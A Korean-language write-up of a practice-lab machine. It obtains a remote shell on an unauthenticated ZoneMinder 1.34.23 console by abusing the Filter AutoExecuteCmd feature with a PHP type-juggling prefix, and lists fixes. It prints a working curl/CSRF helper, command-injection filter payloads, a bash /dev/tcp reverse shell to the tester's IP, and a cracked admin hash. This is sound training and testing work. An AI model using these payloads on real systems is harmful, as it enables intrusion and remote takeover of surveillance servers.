---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/auth-bypass
  - tech/web/cmd-injection
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.214
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---

> [!info] 요약
> 타겟 `192.168.248.214` · Linux (Debian) · Fundamental · **부분 1/2 (user 확보, root 미확보)**
> 진입점: 80 Apache 2.4.53 리버스프록시(백엔드 127.0.0.1:8080) 뒤 `/zm-prod/` 에 **ZoneMinder 1.34.23** 가 `OPT_USE_AUTH` 꺼진 채 무인증 노출 → Monitor 생성으로 Event 유발 → Filter `AutoExecuteCmd`(`zmfilter.pl` 의 `qx()`) 명령실행, **PHP7 느슨비교 타입저글링**을 숫자 접두(`9;`)로 우회 → 리버스셸(www-data, 아웃바운드 tcp/80) → `/home/isaac/local.txt`
> 권한상승: 미확보. 배제 목록·미시도 lead 는 `Privilege Escalation` 절
> 초기 침투는 로그인 폼(`index.php`)만 표면으로 보고 약 2.5시간 실패, 재검토에서 `/server-status` 로그의 경로 힌트로 진입
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.214

### Initial Access – 무인증 ZoneMinder 관리 콘솔의 Filter AutoExecuteCmd 를 PHP 타입저글링으로 우회한 RCE

**Vulnerability Explanation:**
- Apache 2.4.53 리버스프록시(백엔드 `127.0.0.1:8080`) 뒤 `/zm-prod/` 에 ZoneMinder 1.34.23 가 노출. `OPT_USE_AUTH` 가 꺼져 있어 `console`·`options`·`filter`·`monitor` 등 전체 admin 뷰가 로그인 없이 열림
- ZoneMinder 의 Filter 기능 `AutoExecuteCmd` 는 매칭되는 Event 마다 `zmfilter.pl` 의 `qx()`(백틱)로 셸 명령을 실행. 정상 기능이나 무인증 상태에서 그대로 RCE 가 됨
- 저장 로직이 필드 기본값 정수 `0` 과 `!=` 로 느슨비교. PHP 7 에서 비숫자 명령 문자열이 `(int)0` 으로 캐스팅돼 "변경 없음"으로 조용히 버려짐 — 명령 앞자리를 숫자로 만들면(`9;` 접두) nonzero 캐스팅되어 저장 통과

**Vulnerability Fix:**
- `OPT_USE_AUTH` 를 켤 것. 관리 콘솔을 무인증으로 노출하지 말 것
- 감시 웹앱을 리버스 프록시 뒤 인증(basic-auth·VPN)으로 감쌀 것
- `/server-status`(mod_status) 공개 금지 — 내부 경로·백엔드 구조가 유출됨
- 명령 실행 훅은 셸(`qx`/백틱) 대신 인자 배열 실행으로, 실행 계정은 최소권한으로 격리할 것

**Severity:** Critical — 무인증 원격 RCE

**Steps to reproduce the attack:**
1. `/server-status` 로그에서 `/zm-prod/` 경로 확인 → 무인증 ZoneMinder 콘솔 도달
2. `?view=version` 으로 1.34.23 확인
3. Monitor 하나 생성(`Function=Mocord`)해 Event 가 계속 생성되게 함
4. CSRF 토큰을 물고 Filter 저장 — `AutoExecuteCmd` 명령 앞에 숫자 접두(`9;`) 를 붙여 저장
5. `zmfilter.pl` 이 이벤트 매칭 시 명령 실행 → `id` 로 www-data 확인
6. 페이로드를 리버스셸로 교체(아웃바운드 tcp/80) → 대화형 www-data 셸 획득

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.214 | TCP: 22, 80 |

```text
# Nmap 7.98 scan initiated Fri Aug 21 04:41:33 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.214
Nmap scan report for 192.168.248.214
Host is up (0.085s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.53
|_http-title: Cobbles
|_http-server-header: Apache/2.4.53 (Debian)
```
— 출처: `~/PG/Cobbles/nmap.log`

`-p-` 를 **두 번**(fast `--min-rate 5000`, careful `--min-rate 800 --max-retries 3`) 돌려 외부 오픈 포트가 **22/80 뿐**임을 확정. 나머지 65533은 전부 filtered. UDP top-100 은 전부 `open|filtered`(무응답), SNMP(onesixtyone 120 커뮤니티 + snmpwalk public/private/community/manager/cobbles) 무응답 — UDP·SNMP 는 진입점 아님.

`Service Info: Host: 127.0.0.1` 가 눈에 띔 — 80 은 실제로 로컬 백엔드로 도는 리버스 프록시였음(아래).

**웹 표면**

`/` 는 `Cobbles` 라는 로그인 폼(`index.php`, POST username/password). 응답 헤더에 `x-backend-server: primary`, Set-Cookie 없음.

![[PG-Cobbles-login.png]]

`/server-status`(mod_status) 가 열려 있어 백엔드 VHost 가 `127.0.0.1:8080` 임이 드러남 — 즉 80 Apache 는 8080 백엔드로의 프록시.

![[PG-Cobbles-serverstatus.png]]

`/server-status` 스코어보드에는 내부 디렉터리 스캐너의 버스트가 계속 찍혔고, 그 안에 **`GET /zm-prod/ HTTP/1.0`** 이 섞여 있었음(`burst.txt` 에 105회, `burst_uniq.txt` 에 유니크로 남음). 초기 침투 단계에서는 이 스캐너 트래픽을 통째로 "미끼 소음" 으로 판단하고 버렸음. 재검토에서는 이 로그 줄을 **경로 힌트**로 읽음 — 진입의 전부([[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]]).

디렉터리 브루트(feroxbuster: common / directory-list-2.3-medium ~220k×php,txt,html,bak / raft-large-directories)는 `index.php` `style.css` `favicon.png` `server-status` 밖에 못 찾음. **워드리스트에 `zm-prod` 가 없었기 때문** — 자동 열거가 0을 뱉어도 앱이 없는 게 아니라 워드리스트에 그 이름이 없을 뿐이었음([[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#A-23. 워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다]]).

**버전 판정 — 독립 근거 2개**

- `?view=version` → `v1.34.23`
- `~/PG/Cobbles/zm-src` 에 소스를 태그 1.34.23 로 클론해 취약점 근거를 댐

![[PG-Cobbles-zm-version.png]]

버전은 화면이 스스로 밝힘 — "You are running the most recent version of ZoneMinder, v1.34.23."

### Initial Access – ZoneMinder Filter RCE

**배경 — ZoneMinder 와 무인증**

ZoneMinder 는 리눅스용 오픈소스 CCTV/영상감시 소프트웨어. PHP 프론트엔드 + MySQL(`zm` DB) + Perl/C++ 데몬. 웹 진입점은 `index.php` 하나고 `?view=` 로 화면(console·options·filter·monitor·log…)을 라우팅함.

`OPT_USE_AUTH` 옵션이 꺼져 있으면 모든 view 가 로그인 없이 열림. 이 인스턴스가 그랬음:
- `GET /zm-prod/` = 200, `ZMSESSID` 세팅, 타이틀 `ZM - Console`
- `?view=console`·`?view=options&tab=system` 전부 로그인 없이 200 — 전체 admin 콘솔이 무인증

**RCE sink — Filter `AutoExecuteCmd` → `zmfilter.pl` 의 `qx()`**

ZoneMinder 의 이벤트 필터는 "이런 조건의 이벤트가 생기면 이 명령을 실행" 을 설정할 수 있음(`AutoExecute` + `AutoExecuteCmd`). 실행 주체는 `zmfilter.pl`:

```perl
sub executeCommand {
  my $filter = shift;
  my $Event = shift;
  my $event_path = $Event->Path();
  my $command = $filter->{AutoExecuteCmd};
  $command .= " $event_path";
  $command = substituteTags($command, $filter, $Event);
  Info("Executing '$command'");
  my $output = qx($command);
```
— 출처: `zm-src/scripts/zmfilter.pl.in:998-1011`

`qx()`(백틱)는 셸을 거쳐 실행됨. `AutoExecuteCmd` 는 사용자가 필터 저장 폼에 넣는 값이므로, 무인증으로 필터를 만들 수 있으면 그대로 명령 실행. 이벤트 하나당 한 번 실행된다는 점만 유의(그래서 아래에서 Monitor 를 먼저 만듦).

`Info("Executing '$command'")` 이 줄이 뒤에서 진단의 결정타가 됨.

**왜 첫 시도가 조용히 실패했나 — 정수 `0` 과의 느슨비교 (재현의 핵심)**

필터 저장은 `AutoExecuteCmd` 의 기본값이 정수 `0`:

```php
protected $defaults = array(
  ...
  'AutoExecute'     =>  0,
  'AutoExecuteCmd'  =>  0,
```
— 출처: `zm-src/web/includes/Filter.php:8-12`

저장 시 어떤 필드가 "바뀌었는지" 는 `changes()` 가 판정하는데, 스칼라 필드는 이렇게 비교:

```php
if ( $this->{$field} != $value ) {
  $changes[$field] = $value;
}
```
— 출처: `zm-src/web/includes/Object.php:247` (스칼라 분기)

`$this->{'AutoExecuteCmd'}` 는 기본값 정수 `0`, `$value` 는 보낸 명령 문자열. PHP 7 에서 `int == string` 비교는 문자열을 숫자로 캐스팅함:
- `0 != "id > /tmp/x"` → 비숫자 문자열은 `(int)0` 으로 캐스팅 → `0 != 0` = **false** → 변경으로 안 잡힘 → `AutoExecuteCmd` 는 기본값 `0` 그대로 저장됨
- `zmfilter.pl` 은 `qx("0 /event/path")` 를 돌림 — 셸에는 `0` 이라는 명령이 없음. 로그에 **`Executing '0 /path/to/event'`** 가 남음. 명령이 통째로 버려진 것

재검토에서 무인증 로그 뷰의 이 `Executing '0 …'` 를 관측한 게 결정타. 앞선 두 번의 리버스셸 시도(`setsid`·`bash` 처럼 비숫자로 시작하는 페이로드)가 아무 에러 없이 실패한 이유가 이것.

우회는 명령 앞에 `9;`(또는 `1;`) 를 붙여 nonzero 로 캐스팅:
- `0 != "9;bash …"` → `9` 로 시작하는 leading-numeric → `(int)9` → `0 != 9` = **true** → 변경으로 잡혀 저장
- `qx("9;bash … /event/path")` → `9` 는 command-not-found 로 무해하게 죽고, `;` 뒤가 실행됨

`9;` 는 셸 인젝션 우회가 아니라 **PHP 쪽 "변경 감지" 를 통과시키는 타입저글링 우회**. 자동 도구로는 절대 안 나옴 — 저장 폼이 200을 주고도 값이 조용히 사라지는 것을 로그로만 확인 가능([[_PLAYBOOK#A-26. 저장 폼이 200을 줘도 값이 저장되지 않을 수 있다 (PHP 느슨비교 타입저글링)]]).

⚠️ `[가정]` PHP 실행 버전 자체는 이 박스에서 관측하지 못함 — 타겟 PHP 버전을 찍은 산출물 없음. 다만 **관측된 실패(`Executing '0 …'`)가 곧 PHP 7 계열 비교 의미론의 증거**임. PHP 8 이었다면 `0 != "id …"` 가 true 로 잡혀 값이 그대로 저장됐을 것이고, 접두 우회가 필요하지 않았을 것. (OpenSSH 8.4p1 Debian 5 = bullseye 이고 bullseye 기본 PHP 는 7.4 이나, 이는 배포판 기본값 추론이지 실측이 아님.)

**(a) Event 를 만들 Monitor 생성**

필터는 매칭되는 이벤트마다 명령을 돌림. 초기 상태는 Monitor 0개·Event 0개라 필터를 실행해도 반복할 대상이 없음. 먼저 Monitor 를 하나 만들어 이벤트를 계속 생성시킴. `Function=Mocord`(연속 녹화), 소스는 로컬 웹의 `cobbles.jpg` 를 프레임으로 당겨오게 함:

```text
view=monitor
action=monitor
mid=0
newMonitor[Name]=pwn
newMonitor[Type]=Remote
newMonitor[Function]=Mocord
newMonitor[Protocol]=http
newMonitor[Method]=simple
newMonitor[Host]=127.0.0.1
newMonitor[Port]=80
newMonitor[Path]=/cobbles.jpg
...
```
— 출처: `~/PG/Cobbles/mon.data` (전체 필드 포함)

콘솔에 `pwn` Monitor 가 `Mocord`/`Capturing` 으로 뜨고 이벤트 카운터가 올라감. 아래 스크린샷은 무인증 콘솔 + 만들어진 Monitor + 이벤트 107건이 한 화면에 담긴 것 — 진입·이벤트생성·필터 대상이 전부 여기 있음:

![[PG-Cobbles-zm-console.png]]

**(b) CSRF 토큰을 물고 필터 실행**

ZoneMinder 는 `csrf-magic` 을 씀. 먼저 페이지를 GET 해 `ZMSESSID` 쿠키와 `key:HEX,TS` 토큰을 받고, 같은 쿠키 병으로 POST 해야 함. 헬퍼(`zm_post.sh`)가 그 일을 함:

```bash
#!/bin/bash
# usage: zm_post.sh <datafile-with-one-name=value-per-line>
T=192.168.248.214; BASE="http://$T/zm-prod"; CJ=$(mktemp)
BODY=$(curl -s -c "$CJ" "$BASE/index.php?view=console")
TOKEN=$(echo "$BODY" | grep -oE "key:[a-f0-9]{40},[0-9]+" | head -1)
ARGS=(--data-urlencode "__csrf_magic=$TOKEN")
while IFS= read -r line; do
  [ -z "$line" ] && continue
  ARGS+=(--data-urlencode "$line")
done < "$1"
curl -s -b "$CJ" -c "$CJ" -i "$BASE/index.php" "${ARGS[@]}"
rm -f "$CJ"
```
— 출처: `~/PG/Cobbles/zm_post.sh`

먼저 `id` 로 명령 실행 자체를 검증(출력을 웹에서 읽을 수 있는 캐시 경로로 리다이렉트):

```text
view=filter
object=filter
action=execute
Id=
filter[Query][terms][0][attr]=MonitorId
filter[Query][terms][0][op]==
filter[Query][terms][0][val]=1
filter[AutoExecute]=1
filter[AutoExecuteCmd]=1;id>/var/cache/zoneminder/cache/o.txt 2>&1;#
```
— 출처: `~/PG/Cobbles/rce.data` 발췌(숫자 접두 `1;`). 전문에는 `filter[Query][sort_field]`·`sort_asc`·`limit` 세 줄이 더 있음

`filter[Query][terms][0]` = MonitorId==1(=pwn) 로, 방금 만든 모니터의 이벤트에만 매칭시킴. 접두 `1;` 덕에 값이 저장되고, `qx` 가 `id` 를 실행해 `o.txt` 에 www-data 신원이 찍힘.

**(c) 리버스셸**

명령 실행이 확인되자 리버스셸로 승격. LHOST 는 tcp/80 — 실제 콜백이 성립한 회선이 그것.

> [!warning] 「443·ICMP·53 이 막혔다」는 이 박스에서 확정되지 않음 — `[가정]`
> 초기 아웃바운드 프로브(`try1_icmp.log`·`try2_oob.log`, 05:56~05:57)는 둘 다 `0 packets captured` 였으나, 그 시점의 페이로드는 **존재하지 않는 snapshot 뷰**로 발사돼 애초에 실행된 적이 없음. 산출물이 스스로 그렇게 적음 — `WEB_ENTRY_FINDING.txt`: "earlier 443/80 reverse-shell tests fired against the NON-EXISTENT snapshot view, so nothing executed -> egress is NOT confirmed blocked." 이후 필터 경로의 무회신도 아래 타입저글링 삼킴으로 설명됨.
> 확정된 것은 **성공 회선이 tcp/80** 이라는 것뿐 — [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]].
> ⚠️ `egress2~4.log` 의 `192.168.248.214.80 > 192.168.45.207.xxxxx` 패킷은 connect-back 이 아니라 **curl 요청에 대한 타겟 Apache 응답**(source port 80). connect-back 으로 오독하지 말 것.

```text
filter[AutoExecute]=1
filter[AutoExecuteCmd]=9;bash -c "exec 3<>/dev/tcp/192.168.45.207/80&&setsid bash -i <&3 >&3 2>&3 &"
```
— 출처: `~/PG/Cobbles/rsh80.data` 발췌(숫자 접두 `9;`). 전문에는 `filter[Query][sort_field]`·`sort_asc`·`limit`·`terms[0]` 이 더 있음

Kali 에서 `nc -lnvp 80`(tmux) 으로 받음. www-data 대화형 셸이 붙음.

> [!warning] 수동 대안 / 재현 메모
> 리스너는 반드시 tmux 안에서 띄울 것(비대화형 ssh 는 호출 종료 시 자식을 죽임). 페이로드에 `9;`(또는 `1;`) 접두를 빠뜨리면 필터 저장이 200을 주고도 값이 사라져 아무 일도 안 일어남 — 이게 이 박스의 유일한 트릭.

www-data 셸에서 user 플래그를 원위치 `cat`. `/home/isaac/local.txt`, `-rw-r--r--`(world-readable) 라 www-data 로 읽힘.

**Local.txt value:**

```text
f03187be28c3a436d9725bcfd23cb1f6
```
— 출처: `~/PG/Cobbles/proof_user.txt` · **2026-08-21 인스턴스**

> [!warning] 증거 형식 — 한 화면 캡처는 유실
> 값은 대화형 리버스셸(www-data)에서 실측했으나, `whoami; id; hostname; ip a; cat local.txt` 를 한 화면에 담은 캡처를 세션 종료 전에 남기지 못함. `proof_user.txt` 에는 33바이트 값만 있음. 재현 시 반드시 `id;hostname;cat /home/isaac/local.txt` 를 한 번에 찍어 둘 것. (파일이 world-readable 이라 웹셸로도 읽히지만, 대화형 셸에서 원위치 `cat` 했으므로 웹셸 0점 문제에는 해당하지 않음.)

### Privilege Escalation – 없음 (경로 미발견)

**Vulnerability Explanation:** 권한상승 취약점을 확정하지 못함. 아래는 셸 획득 후 열거로 **배제한** 목록과 미시도 lead.

**Vulnerability Fix:** 해당 없음(취약점 미확정)

**Severity:** 해당 없음

**Steps to reproduce the attack:** 해당 없음 — 셸 획득 후 아래 열거만 수행

셸을 잡자마자 표준 열거를 훑고 아래를 **배제**함. 배제 목록 자체가 다음 사람의 지도.

⚠️ 아래 열거는 **리버스셸 세션 «안에서» 실행돼 산출물 파일이 남지 않음**(`~/PG/Cobbles/` 에 harvest 결과 없음, `~/.zsh_history` 는 셸 내부 명령을 기록하지 않음). 판정은 그때의 화면 관측이고 **원문 재확인 불가** — `[가정]` 취급할 것:

- `sudo -l` — sudo 바이너리 없음(설치 안 됨)
- `find / -perm -4000` — SUID 표준 세트만(권한상승 후보 없음)
- `getcap -r /` — 특이 capability 없음
- `/etc/crontab`·`/etc/cron.*`·systemd timer — 표준
- MySQL(`zm` DB) — `secure_file_priv=NULL` 아님(= `INTO OUTFILE` 로 파일쓰기 불가)
- `docker.sock` — www-data 가 docker 그룹 아님
- admin bcrypt 크랙됨(아래) 이나 **SSH·su 로 재사용 안 됨**

ZoneMinder Users 테이블의 admin 해시를 뽑아 크랙:

```text
$2b$12$NHZsm6AM2f2LQVROriz79ul3D6DnmFiZC.ZK5eqbF.ZWfwH9bqUJ6
```
— 출처: `~/PG/Cobbles/admin.hash` → 평문 **`admin`**(admin:admin)

이 크레덴셜은 셸 획득에 기여하지 않음 — 애초에 `OPT_USE_AUTH` 가 꺼져 무인증이었고, `admin:admin` 을 SSH(`isaac`/`root`/`sam`)·`su` 어디에도 재사용할 수 없었음. 태그에 default-creds 를 달지 않음(설명만 하고 쓰지 않은 기법).

**남은 lead 둘 (둘 다 「시도하지 않음」·`[가정]`):**

1. `[가정]` **logrotate postrotate 훅** — `/etc/logrotate.d/zoneminder` 가 회전 후 `/usr/bin/zmpkg.pl` 류를 root 로 실행하고, `/var/log/zm/*` 가 www-data 쓰기 가능이라면 회전 시점에 권한상승 여지가 있음. 다만 zoneminder logrotate 는 대개 **weekly** 라 시험 시간 안에 트리거하기 어려움(강제 회전은 root 권한 필요). 실제 훅 내용·주기는 이 박스에서 확인하지 못함
2. `[가정]` **커널 익스플로잇** — `uname -r` 5.10.0-15(Debian bullseye). 후보는 있으나 공유 랩에서 커널 익스는 리스크가 커 승인 없이 시도하지 않음

### Post-Exploitation

**Proof.txt value:** 미확보 — root 권한상승 경로를 찾지 못해 root 셸을 얻지 못함. 배제 목록·미시도 lead 는 `Privilege Escalation` 절 참고.

**남긴 흔적**

- **셸 획득 후 정리**: `pwn` Monitor 와 실행한 Filter 는 ZoneMinder DB 에 남아 있을 수 있음(무인증 콘솔에서 삭제 가능). 업로드 파일: `/var/cache/zoneminder/cache/o.txt`(id 출력). tmux 세션·리스너는 종료
  ```text
  COBBLES cleanup confirmed 2026-08-21
  tmux: all cob_* sessions killed; tmux server not running (verified: no server running)
  listeners: none (ss -lntp shows only sshd)
  target changes: NONE (no upload, no account, no config, no shell obtained)
  target logs (cannot clean, no shell): access.log ~2.1M brute reqs; auth.log ~700 sam ssh failures
  kali artifacts: ~/PG/Cobbles/ preserved (42 files incl nmap, ferox, hydra/ffuf logs, screenshots, notes)
  ```
  — 출처: `~/PG/Cobbles/traces_confirmed.log`
  ⚠️ 이 파일은 **초기 침투 단계(05:51)에 쓰인 것으로 "셸 미획득" 이라 적혀 있으나, 이후 재검토에서 셸을 얻음** — 최종 상태가 아님. 위 5줄은 초기 침투 실패 시점의 정리 기록이고, `pwn` Monitor·Filter·`o.txt` 는 이 기록에 없는 재검토 단계의 흔적
- **타겟 로그**: access.log 에 초기 침투 단계의 웹 브루트 ~2.1M, auth.log 에 sam SSH 실패 ~700 — 셸 없던 시점이라 정리 불가
- Kali `~/PG/Cobbles/` 산출물 보존: `nmap.log`, `zm-src/`, `mon.data`·`rce.data`·`rsh80.data` 등 필터 페이로드, `zm_post.sh`/`zm_rce.sh` 헬퍼, `admin.hash`, `egress*.log`·`try*.log`, `burst*.txt`, `NOTES_final.txt`·`WEB_ENTRY_FINDING.txt`·`writeup_notes.txt`, 스크린샷
- 스크린샷: `zm-version.png`(버전) · `zm-console.png`(무인증 콘솔+pwn Monitor) — 위에 첨부. 초기 열거 때 찍은 `login.png`·`serverstatus.png` 도 `Service Enumeration` 절에 첨부

## 관련

- ZoneMinder 소스 1.34.23 — `~/PG/Cobbles/zm-src` (근거: `web/includes/Filter.php`, `web/includes/Object.php`, `scripts/zmfilter.pl.in`)
- CVE-2023-26035 — ZoneMinder snapshot 미인증 RCE. **이 박스엔 미적용**(1.34.23 에 snapshot 뷰 없음, [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]]). 반증용 언급이라 `cves` 에 넣지 않음
- 자매 박스 [[Pebbles]] — ZoneMinder 1.29.0, 같은 `OPT_USE_AUTH` off 진입, 다만 RCE 경로는 `limit` 파라미터 pre-auth SQLi
- 이 박스의 시행착오·기법 카드 → [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#A-26. 저장 폼이 200을 줘도 값이 저장되지 않을 수 있다 (PHP 느슨비교 타입저글링)]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#B-1-10. ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE]] · `D`(시간 배분 표)
